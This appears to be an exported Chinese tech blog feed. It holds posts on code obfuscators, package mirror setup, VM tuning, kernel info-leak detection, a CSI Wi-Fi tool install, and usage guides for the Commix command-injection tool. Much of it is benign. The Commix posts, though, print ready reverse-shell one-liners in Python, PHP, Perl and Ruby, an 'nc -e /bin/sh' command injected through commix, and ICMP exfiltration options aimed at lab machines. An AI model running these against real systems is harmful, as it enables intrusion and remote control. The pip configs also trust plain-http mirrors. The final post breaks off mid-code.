      <url>%2F2017%2F01%2F22%2FCTF%E4%B8%AD%E9%82%A3%E4%BA%9B%E6%9C%89%E8%B6%A3%E7%9A%84%E6%B7%B7%E6%B7%86%2F</url>
      <content type="text"><![CDATA[​ ppencode/rrencode/jjencode/aaencode是Perl、Ruby、Javascript的小工具，可以将各自的代码进行混淆，转换成特殊字符，甚至还可以转换成有意思的表情。 ppencode-Perl台湾的Perl达人唐鳳在YAPC曾经介绍过ppencode，它可以把Perl代码转换成只有英文字母的字符串。 下面是转换示例： Demo的地址：http://namazu.org/~takesako/ppencode/demo.html。 rrencode-Rubyrrencode可以把ruby代码全部转换成符号。 下面是转换示例： 项目地址：http://www.lab2.kuis.kyoto-u.ac.jp/~yyoshida/rrencode.html。 jjencode/aaencode-Javascriptjjencode和aaencode都是Yosuke HASEGAWA的作品，前者将JS代码转换成只有符号的字符串，类似于rrencode，介绍的PPT见http://utf-8.jp/public/20090710/jjencode.pps。 后者更好玩，可以将JS代码转换成常用的网络表情，例如“(ﾟΘﾟ)”。示例如下： Demo的地址是：http://utf-8.jp/public/aaencode.html，转换的代码并不复杂，可以在源代码里看到。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[pip源的修改]]></title>
      <url>%2F2017%2F01%2F22%2Fpip%E6%BA%90%E7%9A%84%E4%BF%AE%E6%94%B9%2F</url>
      <content type="text"><![CDATA[1:在windows环境下修改pip镜像源的方法(以python3.5为例):(1):在windows文件管理器中,输入 %APPDATA% (2):会定位到一个新的目录下，在该目录下新建pip文件夹，然后到pip文件夹里面去新建个pip.ini文 (3):在新建的pip.ini文件中输入以下内容，搞定 1234[global]timeout = 6000index-url = http://pypi.douban.com/simpletrusted-host = pypi.douban.com 2：在linux系统中更新pip源的方式(以centos,python2.7为例)在linux环境下的修改方式和在windows环境下修改方式基本相同，这里简单总结一下: (1):在用户的家目录下面创建名为.pip文件夹 (2):在创建好的.pip文件夹中创建名为pip.conf的文件 (3):在pip.conf文件中输入以下内容，ok!!! 1234[global]timeout = 6000index-url = http://pypi.douban.com/simpletrusted-host = pypi.douban.com 3：macOS更改pip源在终端进入目录：cd ~/ 如果没有 .pip 文件夹，那么就要新建这个文件夹，mkdir .pip 然后在.pip 文件夹内vim pip.conf， 写入阿里云 1234567[global]index-url = http://mirrors.aliyun.com/pypi/simple/[install]trusted-host=mirrors.aliyun.com 或者可以使用豆瓣的镜像： 1234567[global]index-url = http://pypi.douban.com/simple[install]trusted-host=pypi.douban.com 好了现在你可以体验快的飞起的pip了。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[你会用你的虚拟机吗?(一)]]></title>
      <url>%2F2017%2F01%2F22%2F%E4%BD%A0%E4%BC%9A%E7%94%A8%E4%BD%A0%E7%9A%84%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%90%97-%E4%B8%80%2F</url>
      <content type="text"><![CDATA[怎么可以让你的虚拟机运行的更快呢？ 1、开启CPU的硬件虚拟化功能现在的CPU几乎都支持硬件虚拟化功能，英特尔称之为VT-x技术，AMD称之为AMD-V技术。在百度搜索你的笔记本型号或主板型号+开启虚拟化，就可以找到相应的开启方法。一般是开机进入bios，然后找到虚拟化技术的选项，将disabled改为enabled。据我所知，用英特尔CPU的电脑，虚拟化技术的选项名称大概含有“virtualization technology”的字眼。 BIOS开启成功后，在虚拟机的设置中，启用硬件加速。 当你成功开启硬件虚拟化功能时，虚拟机的窗口右下角有一个蓝色V的图标，鼠标移上去就会提示成功开启。 2、给虚拟机分配足够的内存既然本机有4GB的内存，那么可以分配1GB供虚拟机上的Ubuntu使用。内存大小根据虚拟机系统的需要来定，如果你跑XP，那么分配512MB已经很足够了。 3、开启3D加速，分配足够显存笔者觉得当初Ubuntu界面卡顿很有可能跟显卡方面的设置有关。于是开启了3D加速，分配了32MB的显存给VirtualBox。性能提升很明显。 4、安装VirtualBox增强功能启动虚拟机。单击虚拟机菜单中的“设备”&gt;“安装增强功能”，也可以按快捷键Host+D。Host键就是虚拟机窗口右下方显示的键，默认为Right Ctrl，即右边的Ctrl键。然后系统会加载增强功能所在的虚拟光盘。点击运行，按提示完成安装，重启虚拟机。 5、电脑的核心都挺多的多分个核就好了。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[gem更换国内源]]></title>
      <url>%2F2017%2F01%2F22%2Fgem%E6%9B%B4%E6%8D%A2%E5%9B%BD%E5%86%85%E6%BA%90%2F</url>
      <content type="text"><![CDATA[12345678910111213gem sources -l#移除https://rubygems.org源gem sources --remove https://rubygems.org/#增加https://gems.ruby-china.org/源gem sources -a https://gems.ruby-china.org/#更新缓存gem sources -u]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[替换homebrew默认源]]></title>
      <url>%2F2017%2F01%2F22%2F%E6%9B%BF%E6%8D%A2homebrew%E9%BB%98%E8%AE%A4%E6%BA%90%2F</url>
      <content type="text"><![CDATA[网上搜的好多都不能用了，但是这个是可以的。 12cd &quot;$(brew --repo)&quot;git remote set-url origin git://mirrors.ustc.edu.cn/brew.git]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Linux内核info leak漏洞]]></title>
      <url>%2F2017%2F01%2F22%2FLinux%E5%86%85%E6%A0%B8info-leak%E6%BC%8F%E6%B4%9E%2F</url>
      <content type="text"><![CDATA[摘要: 介绍一种Linux内核的信息泄漏漏洞检测方法。没什么内容，语义分析，可以集成在Coverity等静态扫描工具中。 1 Information Leak漏洞风险从应用层软件，到hypervisor再到kernel代码，都存在Information Leak的风险。下面给出一些示例： 应用层软件：通常是应用敏感数据泄漏，比如从远程客户端获取服务端敏感数据。CVE-2012-0053，Openssl的心脏滴血等。 Hypervisor：主要是向guest泄漏hypervisor数据。CVE-2010-4525. Kernel代码：泄漏内核地址，空间布局等，如CVE-2013-2147. 这里主要分析内核中的Information Leak漏洞所带来的风险。内核中的Information Leak通常都是用来绕过内核中的保护机制（利用缓解：StackGuard, ASLR），由于本身并不能直接用来形成提权等高风险操作，因此Information Leak漏洞经常被人忽视。 先来看一下这些保护机制。 StackGuard. StackGuard是一种编译器实现的保护技术，它在栈函数返回地址前插入一个“canary”，当发生溢出“canary”值被破坏，将触发系统的异常处理流程。它的安全性依赖于“canary”的保密，也就是“canary”不能被攻击者预测或取到。 ASLR. ASLR技术是将进程等的加载地址随机化，它的安全性依赖于加载基地址的不可预测，使exploit不能精确进行地址覆盖。 无论“canary”还是ASLR的基地址，对攻击者来说都是“秘密”。也就是在没有Information Leak漏洞前提下，这些都是用户不可直接获取的。但Information Leak漏洞可以辅助攻击者获取到这些“秘密”，进而绕过内核中的保护机制，成功实现漏洞利用。 2 Information Leak漏洞分类根据漏洞成因，可以对Information Leak漏洞进行分类。这里同样只关注内核中的情况。 字节对齐带来的内存“空洞”. 为了程序性能，编译器在编译代码时会对变量进行字节对齐，从而引入了一些内存“空洞”。比如结构体使用sizeof计算的大小一般会大于各个成员占用空间大小的和。当这些内核中的内存“空洞”没有被初始化（ABI没有规定函数退栈时要清理这些栈空间），通过copy_to_user等函数拷贝到用户空间时，就会造成Information Leak漏洞，泄漏内核栈中的数据，比如泄漏了一个栈上指针，就可以通过它来计算进程基址（stackjack攻击）。 缺少变量初始化. 内核函数中的本地变量声明后，默认不会被初始化。根据C99描述这块空间的内容是不确定的。实际上栈空间是被各函数复用的，因此未初始化变量的内容很可能保存的是上个函数栈上的数据。 缺少对用户读操作的检查. 当向用户空间拷贝数据时，没有做大小检查或者检查逻辑出现错误，都会导致Information Leak。这类漏洞通常称作“越界读”，它允许用户态读取不应该被访问的内核空间数据。 其它bug导致的infoleaks. 其它的Information Leak原因这里不做研究，但提一下。比如/proc/,/sys/和/boot/文件系统中也提供了内核符号地址，它们已经靠kptr_restrict机制保护，但也可能因为bug而绕过。另外系统缓存，日志等都有可能导致Information Leak. 上面说到Information Leak可能危害保证StackGuard和ASLR可靠基础的“秘密”，下面分析一下内核中的Information Leak确切会影响哪些数据。 Data段. 内核中的data段保存了编译时就确定的全局变量，data段的泄漏可能导致静态内核symbols的泄漏，比如某些用于配置的变量。 栈 内核栈是根据ABI约定，运行时分配的。里面包含了函数返回地址，栈指针和一些其它数据。比如函数调用的参数，StackGuard机制的“canary”等。另外如果没有实现栈地址随机化，还会泄漏栈布局。 堆 内核中的堆是由内存分配器管理，在需要的地方动态分配。这些堆分配器通常使用双向链表来管理这些堆内存。Information Leak会漏洞这些堆存储的内容，还有可能泄漏用于堆管理的结构数据。 3 栈的Information Leak漏洞检测技术分析目前的漏检测技术，发现通过数据流分析的方法，可以对Information Leak进行建模来进行漏洞检测。在模型里定义3个基本元素：数据源，数据接收方和传播路径。 我们可以对程序进行语义分析来匹配这套模型，从而识别漏洞。语义分析这个工作，选用开源的Coccinelle工具。 12345678910111213handler(...) &#123; &lt;... T ID; ... when != memset(&amp;ID, 0, ...) when != ID = ...* copy_to_user(EV, &amp;ID, EN) ...&gt;&#125; 1) 数据源：ID变量 2) 数据接收方：用户态指针EV 3) 传播路径：我们想确定ID的内容没有被初始化。因此限定条件，ID在copy_to_user前没有memset()或初始化操作 像其它基于数据流的静态检测技术类似，这种方法也存在缺陷。比如这种Information Leak检测方法假定漏洞发生在一个函数内的，因此这种方法覆盖不了多函数场景。但实际测试中，依然会发现很多Linux内核和三方Driver的Information Leak漏洞。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[linux-csi-tools部署记录]]></title>
      <url>%2F2017%2F01%2F21%2Flinux-csi-tools%E9%83%A8%E7%BD%B2%E8%AE%B0%E5%BD%95%2F</url>
      <content type="text"><![CDATA[我采用old installation instruction 的方法，并对里面个别几个地方有所修改，以适应国内有墙的现状。参考了一部分这个博客。打开终端把代码复制到终端运行即可。 准备工作我安装了Ubuntu10.04 desktop-i386版，使用的是刻录光盘镜像的方法，大家也可以制作启动u盘或者用虚拟机安装到物理硬盘（我最喜欢的方式）。注意/home分区要留足够的空间（建议10gb以上），/分区也要足够大，建议5gb以上。其他部分很简单，按照安装包的指示一步步来就可以。因为要编译新内核，根目录空间不足的话会不成功。安装的时候注意几个问题，linux碎片化严重，用不受支持的linux发行版或版本会导致编译失败，非常令人头疼。而ubuntu lts版支持时间也不长，安装软件的话如果apt用不了可以试着去百度或launchpad找deb包。 到对方提供的github网址里面，下载源代码，到右栏可以找到download zip file，下载完毕之后解压放到～/下面，文件夹改名为linux-80211n-csitool（放到别的地方也可以，不过需要修改下面每一条引用它的代码），由于国内网络环境不好，文件过大，用git clone的话及其容易失败，其他的小文件没关系，大家自己解决vpn吧，到网上搜索linvpn应该可以用一阵子，不过ubuntu的vpn设置方面有几点需要注意，百度上面也有介绍。现在比较好用的解决网络问题的方案是lantern和hosts 1sudo gedit /etc/modprobe.d/blacklist.conf 把下面内容粘贴进去，保存。 12345# blacklist modules under active development blacklist iwldvm blacklist iwlwifi blacklist mac80211 blacklist cfg80211 该步骤是为了禁止wifi，这样做的目的是让安装驱动的时候不容易出问题 Install necessary packages on Ubuntu安装内核组件 1sudo apt-get -y install git-core kernel-package fakeroot build-essential ncurses-dev 它们是用来编译用户空间工具的库 1sudo apt-get -y install libnl-dev libssl-dev # Install some necessary libraries iw可以用来在命令行界面开启wifi的监控模式和开启40mhz信道。 1sudo apt-get -y install iw Download, configure, compile, and install our custom Linux kernel下载附加的工具 1git clone git://github.com/dhalperi/linux-80211n-csitool-supplementary.git 设置内核 123cd linux-80211n-csitool # Go into the kernel src directorymake oldconfig # Use our optimized kernel configmake menuconfig # Enable your system-specific hardware 编译内核 12345make -j3 bzImage modules # -j3 here is 3-way parallelism, try #cores+1sudo make install modules_install # INSTALLsudo mkinitramfs -o /boot/initrd.img-`cat include/config/kernel.release` \ `cat include/config/kernel.release` # create ramdisk used to bootsudo update-grub 我在这些步骤里面出现了编译错误的情况，原因是里面的一些头文件和源代码文件名大小写不一致，解决方法是想办法把它复制一下，然后改成大小写一致的文件名（原来的不要删掉） 在一篇csdn blog里面，有人还这么说，如果编译出错，可以试着按照这里来做（关于这一部分，先在窗口输入cat include/config/kernel.release（注意是在 linux-80211n-csitool目录下）获取版本号，一般为3.5.7-csitool。将上述指令改为：sudo mkinitramfs -o /boot/initrd.img-3.5.7-csitool 3.5.7-csitool （注意空格）即可。后续的指令中均要将‘cat include/config/kernel.release’改为3.5.7-csitool）然而这个方法并不好用 下面安装头文件，记录csi的软件需要用它来编译 12sudo mkdir /usr/src/linux-headers-`cat include/config/kernel.release`sudo cp -rf usr/include /usr/src/linux-headers-`cat include/config/kernel.release`/include 编译成功之后重启，就会进入修改过的内核 Install our custom firmware.1sudo gedit /etc/modprobe.d/blacklist.conf 这一步把blacklist iwlwifi删掉，否则无法连接wifi，删掉之后只能连接没密码的wifi。运行下面的 1234567#backup original firmware, good for referencesudo cp /lib/firmware/iwlwifi-5000-2.ucode /lib/firmware/iwlwifi-5000-2.ucode.origsudo mv /lib/firmware/iwlwifi-5000-2.ucode /lib/firmware/iwlwifi-5000-2.ucode.orig# copy ours in separately, keeping name for referencesudo cp iwlwifi-5000-2.ucode.sigcomm2010 /lib/firmware/# install ourssudo cp iwlwifi-5000-2.ucode.sigcomm2010 /lib/firmware/iwlwifi-5000-2.ucode 这一步也有点小问题，这里面的文件名可能是有些小问题，如果出错的话，把固件改名，复制到该文件夹里。我的电脑里面iwlwifi系列如下所示 12345iwlwifi-1000-3.ucode iwlwifi-5000-2.ucode.origiwlwifi-3945-2.ucode iwlwifi-5000-2.ucode.sigcomm2010iwlwifi-4965-2.ucode iwlwifi-5150-2.ucodeiwlwifi-5000-1.ucode.orig iwlwifi-6000-4.ucodeiwlwifi-5000-2.ucode Download and compile hostapAt the time of writing, hostap 0.7 is the stable version. 123456cd # Back out of the kernel treegit clone git://w1.fi/srv/git/hostap-07.git # Get the codecd hostap-07/hostapdcp &lt;hostap-dotconfig&gt; .config # Our hostap config from linux-80211n-csitool-supplementary/hostap-config-files/makecp &lt;hostapd.conf-test&gt; hostapd.conf # Install the vanilla hostap conf we provide 这一步没有问题，安装hostapd，把电脑当作access point，功能相当于无线路由器，也可以直接用路由器，省略这一步 Install the userspace logging utilityThe userspace netlink tool that logs CSI is located in the supplementary material git at linux-80211n-csitool-supplementary/netlink/. 123cd ~/linux-80211n-csitool-supplementary/netlink # We assume you install into your home directorymake # hopefully the make succeeds!# If not, figure out why it didn&apos;t compile. Did you install the Linux headers above? 编译hostap，实际上这个不编译也没关系，因为有路由器或者安桌手机就可以充当ap Let’s try it out!1234sudo modprobe iwlwifi # did it work? Do you see logs about iwlwifi in the dmesg?sudo iwlist scanning # 扫描ap，窗口中会出现可以扫描到的无线网络。sudo ~/hostap-07/hostapd/hostapd ~/hostap-07/hostapd/hostapd.conf# 是启动hostap，此时本机电脑作为ap（相当于路由器的功能）。此时无线网络若还处于连接状态就会出错 测试hostap时： 1sudo ~/hostap-07/hostapd/hostapd ~/hostap-07/hostapd/hostapd.conf 是启动hostap，此时本机电脑作为ap（相当于路由器的功能）。此时无线网络若还处于连接状态就会出错：所以执行该命令前必须将无线网络连接断开，此时作为路由功能开启(出现结果)： 123using interface wlan0 with hwaddr 00:21:6a:35:4f:00 and ssid &apos;csitool-test&apos;wlan0:STA 38:bc:1a:0d:69:9f IEEE 802.11:authenticatedwlan0:STA 38:bc:1a:0d:69:9f IEEE 802.11:associated(aid 1) 手机可以连上‘csitool-test’的网络，状态一直是正在获取ipMake sure to kill hostapd when you’re done. Then put 802.11n-enabled hostapd config file in place: 1cp &lt;hostapd.conf-real&gt; hostapd.conf # Install the real hostap conf we provide 采集csi数据部分（关闭本机电脑作为路由的功能，保证连无线网的功能即可，用另一台电脑开启hostapd作为ap）： 1234sudo rmmod iwlwifi mac80211 cfg80211 # remove the modulessudo modprobe iwlwifi connector_log=0x1 #load the modules and set userspace beamforming logging#first,associate and set up IP to an AP that will send you HT packets#需要用另外一台电脑作为ap并设置好IP地址，当前电脑连上那个ap 12cd ~/linux-80211n-csitool-supplementary/netlinksudo ./log_to_file tmp.dat #当前电脑相当于dp（探测点），log_to_file tmp.dat可以记录csi的值 再打开另一个终端（命令行窗口）ping ，ping所连ap的ip地址，ping多次过后便会有csi数据 1234sudo rmmod iwlwifi mac80211 cfg80211 sudo modprobe iwlwifi connector_log=0x1cd ~/wifil/netlinksudo ./log_to_file &lt;地址/文件名&gt; 最后，使用该软件的时候，现一行一行地把上面代码部分粘贴到terminal里面，再连接没密码的wifi，然后再打开另一个terminal，ping 该ap的ap地址就可以运行另外，安卓手机ping的ap地址是192.168.43.1用路由器的话设置成接入点模式。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Commix命令详解]]></title>
      <url>%2F2017%2F01%2F21%2FCommix%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%2F</url>
      <content type="text"><![CDATA[介绍项目地址：https://github.com/stasinopoulos/commix Commix是一个使用Python开发的漏洞测试工具，这个工具是为了方便的检测一个请求是否存在命令注入漏洞，并且对其进行测试，在其作者发布的最新版本中支持直接直接导入burp的历史记录进行检测，大大提高了易用性。 使用123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081选项： -v VERBOSE详细程度级别（0-1，默认值：0）。 --version 显示版本号并退出。 --output-dir=.. 设置自定义输出目录路径。 -s SESSION_FILE 从存储（.sqlite）文件加载会话。 --flush-session 刷新当前目标的会话文件。 --ignore-session 忽略存储在会话文件中的结果。 目标： -u URL，--url = URL 目标URL。 --url-reload 在命令执行后重新加载目标URL。 -l LOGFILE 解析来自HTTP代理日志文件的目标和数据。 --crawl = CRAWLDEPTH 从目标网址开始抓取网站（1-2，默认值：0）。 请求： --data=DATA 要通过POST发送的数据字符串。 --host=HOST HTTP主机头。 --referer=REFERER HTTP Referer标头。 --user-agent=AGENT HTTP用户代理头。 --random-agent 使用随机选择的HTTP User-Agent头。 --param-del=PDEL 设置分割参数值的字符。 --cookie=COOKIE HTTP Cookie头。 --cookie-del=CDEL 设置分割cookie值的字符。 --headers=HEADERS 额外标头（例如「Header1：Value1 \ nHeader2：Value2」）。 --proxy=PROXY 使用HTTP代理（例如“127.0.0.1:8080”）。 --tor 使用Tor网络。 --tor-port=... 设置Tor代理端口（默认值：8118）。 --auth-url=... 登录面板URL。 --auth-data =AUTH 登录参数和数据。 --auth-type =AUTH HTTP认证类型（例如“基本”或“摘要”）。 --auth-cred =AUTH HTTP身份验证凭据（例如“admin：admin”）。 --ignore-401 忽略HTTP错误401（未授权）。 --force-ssl 强制使用SSL / HTTPS。 枚举： 这些选项可用于枚举目标主机。 --all 检索一切。 --current-user 检索当前用户名。 --hostname 检索当前主机名。 --is-root 检查当前用户是否具有root权限。 --is-admin 检查当前用户是否具有管理员权限。 --sys-info 检索系统信息。 --users 检索系统用户。 --passwords 检索系统用户密码散列。 --privileges 检索系统用户权限。 --ps-version 检索PowerShell的版本号。 文件访问： 这些选项可用于访问目标主机上的文件。 --file-read = FILE .. 从目标主机读取文件。 --file-write = FIL .. 写入目标主机上的文件。 --file-upload = FI .. 在目标主机上上传文件。 --file-dest = FILE .. 写入和/或上传到的主机的绝对文件路径。 模块： 这些选项可用于增加检测和/或注射能力。 --icmp-exfil = IP_ ..&apos;ICMP exfiltration&apos;注入模块。 （例如&apos;ip_src = 192.168.178.1，ip_dst = 192.168.178.3&apos;）。 --dns-server = DNS ..“DNS exfiltration”注入模块。 （用于DNS筛选攻击的域名）。 --shellshock“炮弹”注射模块。 注射： 这些选项可用于指定要插入和输入的参数,提供定制注入有效负载。 -p TEST_PARAMETER 可测试参数。 --suffix = SUFFIX 注入有效负载后缀字符串。 --prefix = PREFIX 注入有效负载前缀字符串。 --technique = TECH 指定要使用的进样技术。 --maxlen = MAXLEN 设置与时间相关的最大输出长度,注射技术（默认：10000字符）。 --delay = DELAY 设置与时间相关的注入的自定义时间延迟术（默认：1秒）。 --tmp-path = TMP_P .. 设置Web服务器的临时目录的绝对路径。 --root-dir = SRV_R .. 设置Web服务器根目录的绝对路径。 --alter-shell = AL .. 使用另一个os-shell（例如&apos;Python&apos;）。 --os-cmd = OS_CMD 执行单个操作系统命令。 --os = OS 将后端操作系统强制为此值。 --tamper = TAMPER 使用给定脚本篡改注射数据。 检测： 这些选项可用于自定义检测阶段。 --level = LEVEL 要执行的测试级别（1-3，默认值：1）。 --skip-calc 在检测期间跳过数学计算 --dependencies 检查第三方（非内核）依赖关系。 --skip-waf 绕过启发式检测WAF / IPS / IDS保护。 例子1234567891011121314151617181920212223242526272829python commix.py –url=&quot;http://192.168.1.4/test/test.php?addr=INJECT_HERE” --os-cmd=&quot;nc -e /bin/sh 192.168.1.3 1234″Freebuf给出的一些用法（http://www.freebuf.com/sectool/64030.html）测试漏洞web应用Damnpython commix.py --url=&quot;http://192.168.178.58/DVWA-1.0.8/vulnerabilities/exec/#&quot; --data=&quot;ip=INJECT_HERE&amp;submit=submit&quot; --cookie=&quot;security=medium; PHPSESSID=nq30op434117mo7o2oe5bl7is4&quot;使用注入攻击Payload参数测试php-Charts 1.0python commix.py --url=&quot;http://192.168.178.55/php-charts_v1.0/wizard/index.php?type=INJECT_HERE&quot; --prefix=&quot;//&quot; --suffix=&quot;&apos;&quot;使用特殊的头和HTTP代理测试OWASP Mutillidaepython commix.py --url=&quot;http://192.168.178.46/mutillidae/index.php?popUpNotificationCode=SL5&amp;page=dns-lookup.php&quot; --data=&quot;target_host=INJECT_HERE&quot; --headers=&quot;Accept-Language:fr\nETag:123\n&quot; --proxy=&quot;127.0.0.1:8081&quot;使用ICMP渗漏（exfiltration）技术测试Persistencesu -c &quot;python commix.py --url=&quot;http://192.168.178.8/debug.php&quot; --data=&quot;addr=127.0.0.1&quot; --icmp-exfil=&quot;ip_src=192.168.178.5,ip_dst=192.168.178.8&quot;&quot; 配合一些反弹shell1. Python-reverse-shell: python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\”192.168.1.3\”,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\”/bin/sh\”,\”-i\”]);’2. PHP-reverse-shell: php -r ‘\$sock=fsockopen(\”192.168.1.3\”,1234);exec(\”/bin/sh -i &lt;%263 &gt;%263 2&gt;%263\”);’3. Perl-reverse-shell: perl -e ‘use Socket;\$i=\”192.168.1.3\”;\$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\”tcp\”));if(connect(S,sockaddr_in(\$p,inet_aton(\$i))))&#123;open(STDIN,\”&gt;%26S\”);open(STDOUT,\”&gt;%26S\”);open(STDERR,\”&gt;%26S\”);exec(\”/bin/sh -i\”);&#125;;’4. Ruby-reverse-shell: ruby -rsocket -e ‘exit if fork;c=TCPSocket.new(\”192.168.1.3\”,1234);while(cmd=c.gets);IO.popen(cmd,\”r\”)&#123;|io|c.print io.read&#125;end’]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[commix使用示例]]></title>
      <url>%2F2017%2F01%2F21%2Fcommix%E4%BD%BF%E7%94%A8%E7%A4%BA%E4%BE%8B%2F</url>
      <content type="text"><![CDATA[1. Exploiting Damn Vulnerable Web App:1root@kali:~/commix# python commix.py --url=&quot;http://192.168.178.58/DVWA-1.0.8/vulnerabilities/exec/#&quot; --data=&quot;ip=127.0.0.1&amp;submit=submit&quot; --cookie=&quot;security=medium; PHPSESSID=nq30op434117mo7o2oe5bl7is4&quot; 2. Exploiting php-Charts 1.0 using injection payload suffix &amp; prefix string:1root@kali:~/commix# python commix.py --url=&quot;http://192.168.178.55/php-charts_v1.0/wizard/index.php?type=test&quot; --prefix=&quot;&apos;&quot; --suffix=&quot;//&quot; 3. Exploiting OWASP Mutillidae using extra headers and HTTP proxy:1root@kali:~/commix# python commix.py --url=&quot;http://192.168.178.46/mutillidae/index.php?popUpNotificationCode=SL5&amp;page=dns-lookup.php&quot; --data=&quot;target_host=127.0.0.1&quot; --headers=&quot;Accept-Language:fr\nETag:123\n&quot; --proxy=&quot;127.0.0.1:8081&quot; 4. Exploiting Persistence using ICMP exfiltration technique:1root@kali:~/commix# python commix.py --url=&quot;http://192.168.178.8/debug.php&quot; --data=&quot;addr=127.0.0.1&quot; --icmp-exfil=&quot;ip_src=192.168.178.5,ip_dst=192.168.178.8&quot; 5. Exploiting Persistence using an alternative (python) shell:1root@kali:~/commix# python commix.py --url=&quot;http://192.168.178.8/debug.php&quot; --data=&quot;addr=127.0.0.1&quot; --alter-shell=&quot;Python&quot; 6. Exploiting Kioptrix: Level 1.1 (#2):1root@kali:~/commix# python commix.py --url=&quot;http://192.168.178.2/pingit.php&quot; --data=&quot;ip=127.0.0.1E&amp;submit=submit&quot; --auth-url=&quot;http://192.168.178.2/index.php&quot; --auth-data=&quot;uname=admin&amp;psw=%27+OR+1%3D1--+-&amp;btnLogin=Login&quot; 7. Exploiting Kioptrix: 2014 (#5) using custom user-agent and specified injection technique:1root@kali:~/commix# python commix.py --url=&quot;http://192.168.178.6:8080/phptax/drawimage.php?pfilez=127.0.0.1&amp;pdf=make&quot; --user-agent=&quot;Mozilla/4.0 Mozilla4_browser&quot; --technique=&quot;f&quot; --root-dir=&quot;/&quot; 8. Exploiting CVE-2014-6271/Shellshock:1root@kali:~/commix# python commix.py --url=&quot;http://192.168.178.4/cgi-bin/status/&quot; --shellshock 9. Exploiting commix-testbed (cookie) using cookie-based injection:1root@kali:~/commix# python commix.py --url=&quot;http://192.168.2.8/commix-testbed/scenarios/cookie/cookie(blind).php&quot; --cookie=&quot;addr=127.0.0.1&quot; 10. Exploiting commix-testbed (user-agent) using ua-based injection:1root@kali:~/commix# python commix.py --url=&quot;http://192.168.2.4/commix-testbed/scenarios/user-agent/ua(blind).php&quot; --level=3 11. Exploiting commix-testbed (referer) using referer-based injection:1root@kali:~/commix# python commix.py --url=&quot;http://192.168.2.4/commix-testbed/scenarios/referer/referer(classic).php&quot; --level=3 12. Exploiting Flick 2 using custom headers and base64 encoding option:1root@kali:~/commix# python commix.py --url=&quot;https://192.168.2.12/do/cmd/*&quot; --headers=&quot;X-UUID:commix\nX-Token:dTGzPdMJlOoR3CqZJy7oX9JU72pvwNEF&quot; --base64 13. Exploiting commix-testbed (JSON-based) using JSON POST data:1root@kali:~/commix# python commix.py --url=&quot;http://192.168.2.11/commix-testbed/scenarios/regular/POST/classic_json.php&quot; --data=&apos;&#123;&quot;addr&quot;:&quot;127.0.0.1&quot;,&quot;name&quot;:&quot;ancst&quot;&#125;&apos; 14. Exploiting SickOs 1.1 using shellshock module and HTTP proxy:1root@kali:~/commix# python commix.py --url=&quot;http://192.168.2.8/cgi-bin/status&quot; --shellshock --proxy=&quot;192.168.2.8:3128&quot;`]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[基于CSI的移动目标侦测研究学习]]></title>
      <url>%2F2017%2F01%2F21%2F%E5%9F%BA%E4%BA%8ECSI%E7%9A%84%E7%A7%BB%E5%8A%A8%E7%9B%AE%E6%A0%87%E4%BE%A6%E6%B5%8B%E7%A0%94%E7%A9%B6%E5%AD%A6%E4%B9%A0%2F</url>
      <content type="text"><![CDATA[环境安装需要用到CSI tool，这是一个运行在Ubuntu上的利用Intel Wi-Fi Wireless Link 5300 802.11n来做分析的程序。这里可以使用作者网站中方法来安装，也可以下载清华的版本。清华的版本附带了安装说明书，参考说明书上的方法，安装即可。 需要注意的是，发射源路由器需要选择单天线支持802.11n的路由器，我使用的是TP-LINK TL-WR742N。 获取数据cd进入csitools文件夹，进入linux-80211n-csitool-supplementary/netlink，运行 1sudo ./log_to_file tmp.dat 打开另一个终端，运行 1ping 192.168.1.1 -i 0.2 netlink文件夹中的tmp.dat就是采集的原始数据。 读取数据使用Matlab读取数据，进入linux-80211n-csitool-supplementary/matlab文件夹，使用read_bf_file函数可以读取数据。 一个例子数据包里包含 123456789101112timestamp_low: 4 (In the sample trace, timestamp_low is invalid and always 4.)bfee_count: 72Nrx: 3Ntx: 1rssi_a: 33rssi_b: 37rssi_c: 41noise: -127agc: 38perm: [3 2 1]rate: 256csi: [1x3x30 double] timestamp_low 是时间戳 bfee_count 数据包数量 Nrx,Ntx 分别表示接收端和发送端的天线数量 rssi_a, rssi_b, rssi_c 每个天线的RSSI数据，单位dB， agc Automatic Gain Control perm NIC重排列后的顺序结果，代表RF链路的顺序 rate 发送包的rate csi CSI原始数据，是个Ntx×Nrx×30复数矩阵 主要提取出CSI数据和timestamp_low。 数据预处理为了避免相位的偏移的影响，需要将相位进行线性变换，参考论文，写出了以下Python代码: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859from math import *import numpy as npimport copyN = 1000 # N为采集的数据包数量def complexDecoding(raw_data):“””将原始数据转化为Python可识别的复数这里使用了第一个天线的数据raw_data[0]第二根第三根天线数据下标分别为1, 2原始数据为a + bi, python为a + bj返回处理后的数据“””for n in range(N):for i in range(30): # 30 代表子载波数量，固定为30if raw_data[0][-1] == ‘i’:data.append(complex(raw_data[0][:-1]+‘j’))else:data.append(complex(raw_data[0]))return datadef getAP(data):“””根据复数计算振幅和相位“””amplitudes = [([] * 30) for i in range(N)]phases = [([] * 30) for i in range(N)]for m in range(N):for i in range(30):r = sqrt((data[i + m * 30].real) ** 2 + (data[i + m * 30].imag) ** 2)amplitudes[m].append(r)phases[m].append(np.angle(data[i + m * 30]))return (amplitudes, phases)def preprocessingPhase(phases):“””将相位进行线性变换index是 -28 到 28 根据 IEEE 802.11n 协议返回变换后的相位“””index = range(-28,0,2) + [-1, 1] + range(3,28, 2) + [28]for m in range(N):for l in range(10):clear = Truebase = 0tphases[m][0] = phases[m][0]for i in range(1, 30):if phases[m][i] – phases[m][i-1] &gt; pi:base += 1clear = Falseelif phases[m][i] – phases[m][i-1] &lt; -pi:base –= 1clear = Falsetphases[m][i] = 